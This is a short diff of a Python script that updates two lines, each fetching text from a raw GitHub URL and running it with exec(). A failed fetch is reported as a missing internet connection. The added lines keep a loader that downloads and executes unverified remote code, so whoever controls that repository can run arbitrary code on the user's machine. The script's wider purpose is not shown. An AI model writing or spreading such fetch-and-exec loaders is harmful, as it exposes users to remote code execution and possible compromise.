@@ -25,13 +25,13 @@ except:pass
 from datetime import date
 today = date.today()
 try:
-    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text').text
+    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text.txt').text
     exec(data)
 except:
     print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection-l ..!');exit()
 #VERSION 
 try:
-    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text').text
+    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text.txt').text
     exec(data)
 except:
     print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection ..!');exit()
